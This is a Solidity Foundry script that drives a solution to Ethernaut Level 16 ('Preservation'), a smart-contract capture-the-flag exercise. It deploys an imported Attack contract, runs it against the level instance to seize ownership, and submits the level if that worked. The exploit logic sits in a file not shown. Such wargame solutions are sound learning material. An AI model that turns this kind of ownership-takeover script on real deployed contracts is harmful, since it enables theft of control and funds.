// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Preservation} from "../src/Level16.sol";
import {Attack} from "../src/Level16Attack.sol";

contract Level16 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Preservation instance = Preservation(vm.envAddress("LVL16_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();

        attack.attackPreservation(instance);

        if (instance.owner() == me) {
            console2.log("Level16: Success");
            ethernaut.submitLevelInstance(address(instance));
        } else {
            console2.log("Level16: Failed");
        }

        vm.stopBroadcast();
    }
}
